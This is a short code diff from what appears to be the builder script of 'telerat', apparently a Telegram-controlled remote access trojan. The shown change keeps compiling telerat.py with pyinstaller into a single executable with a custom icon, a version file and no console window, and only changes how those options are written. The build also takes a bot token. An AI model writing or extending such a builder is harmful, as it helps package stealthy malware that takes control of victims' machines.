@@ -36,7 +36,7 @@ def start(bot_token):
             file.write(filedata)
 
 
-        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
+        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt -w -F Source_Files/telerat.py')
         os.system('rd /s /q build')
         os.remove('telerat.spec')
         copyfile('dist/telerat.exe', 'telerat.exe')
